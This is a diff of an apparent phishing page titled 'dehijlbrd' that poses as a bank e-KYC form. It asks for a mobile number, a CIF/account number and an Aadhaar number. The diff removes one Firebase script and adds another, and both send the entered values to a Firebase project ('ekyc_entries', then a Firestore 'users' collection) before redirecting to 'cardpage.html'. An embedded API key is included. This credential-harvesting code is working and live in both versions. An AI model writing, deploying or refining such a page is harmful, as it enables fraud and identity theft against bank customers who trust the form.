@@ -3,70 +3,6 @@
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <!-- Firebase SDKs -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
-      authDomain: "marcokinghoga.firebaseapp.com",
-      databaseURL: "https://marcokinghoga-default-rtdb.firebaseio.com",
-      projectId: "marcokinghoga",
-      storageBucket: "marcokinghoga.firebasestorage.app",
-      messagingSenderId: "132474071601",
-      appId: "1:132474071601:web:7c44a66fca6dc000e90310"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-
-    window.validateForm = function () {
-      let isValid = true;
-
-      const mobile = document.getElementById("mobile").value.trim();
-      const account = document.getElementById("account").value.trim();
-      const customerid = document.getElementById("customerid").value.trim();
-
-      const mobilePattern = /^[6-9][0-9]{9}$/;
-
-      document.getElementById("mobileError").style.display = "none";
-      document.getElementById("accountError").style.display = "none";
-      document.getElementById("aadhaarError").style.display = "none";
-
-      if (!mobilePattern.test(mobile)) {
-        document.getElementById("mobileError").style.display = "block";
-        isValid = false;
-      }
-
-      if (account.length !== 11 || isNaN(account)) {
-        document.getElementById("accountError").style.display = "block";
-        isValid = false;
-      }
-
-      if (customerid.length !== 12 || isNaN(customerid)) {
-        document.getElementById("aadhaarError").style.display = "block";
-        isValid = false;
-      }
-
-      if (isValid) {
-        push(ref(db, "ekyc_entries"), {
-          mobile,
-          account,
-          aadhaar: customerid,
-          timestamp: new Date().toISOString()
-        }).then(() => {
-          window.location.href = "cardpage.html";
-        }).catch(error => {
-          alert("Data send failed: " + error.message);
-        });
-      }
-
-      return false;
-    };
-  </script>
-
   <style>
     body {
       font-family: Arial;
@@ -91,12 +27,18 @@
       border-radius: 5px;
     }
     .form-container {
+      margin-top: 0px;
       text-align: left;
       max-width: 400px;
-      margin: auto;
-      background: transparent;
+      margin-left: auto;
+      margin-right: auto;
+      background: #ffffff00;
       padding: 20px;
       border-radius: 10px;
+      box-shadow: 0 0 0px rgba(0,0,0,0.1);
+    }
+    .headline {
+      margin-top: 0px;
     }
     .headline h1 {
       font-size: 22px;
@@ -135,18 +77,6 @@
       border-radius: 10px;
       margin-top: 20px;
     }
-
-    @media (max-width: 500px) {
-      .form-container {
-        padding: 10px;
-      }
-      .input-group input {
-        font-size: 14px;
-      }
-      .side-button {
-        font-size: 16px;
-      }
-    }
   </style>
 </head>
 <body>
@@ -162,7 +92,7 @@
       <div class="input-group">
         <label for="mobile">Mobile Number</label>
         <input type="tel" id="mobile" name="mobile" maxlength="10" placeholder="Enter 10-digit Mobile" required>
-        <div class="error" id="mobileError">⚠️ Mobile Number.</div>
+        <div class="error" id="mobileError"> ⚠️ Mobile Number.</div>
       </div>
       <div class="input-group">
         <label for="account">CIF/Account Number</label>
@@ -180,5 +110,69 @@
     <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg" alt="Extra Image 1">
     <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Extra Image 2">
   </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
+      authDomain: "marcokinghoga.firebaseapp.com",
+      projectId: "marcokinghoga",
+      storageBucket: "marcokinghoga.firebasestorage.app",
+      messagingSenderId: "132474071601",
+      appId: "1:132474071601:web:7c44a66fca6dc000e90310"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function validateForm() {
+      let isValid = true;
+
+      const mobile = document.getElementById("mobile").value.trim();
+      const account = document.getElementById("account").value.trim();
+      const customerid = document.getElementById("customerid").value.trim();
+
+      const mobilePattern = /^[6-9][0-9]{9}$/;
+
+      document.getElementById("mobileError").style.display = "none";
+      document.getElementById("accountError").style.display = "none";
+      document.getElementById("aadhaarError").style.display = "none";
+
+      if (!mobilePattern.test(mobile)) {
+        document.getElementById("mobileError").style.display = "block";
+        isValid = false;
+      }
+
+      if (account.length !== 11 || isNaN(account)) {
+        document.getElementById("accountError").style.display = "block";
+        isValid = false;
+      }
+
+      if (customerid.length !== 12 || isNaN(customerid)) {
+        document.getElementById("aadhaarError").style.display = "block";
+        isValid = false;
+      }
+
+      if (isValid) {
+        db.collection("users").add({
+          mobile: mobile,
+          account: account,
+          aadhaar: customerid,
+          timestamp: new Date()
+        })
+        .then(() => {
+          window.location.href = "cardpage.html";
+        })
+        .catch((error) => {
+          alert("Error saving data: " + error);
+        });
+      }
+
+      return false;
+    }
+  </script>
 </body>
 </html>
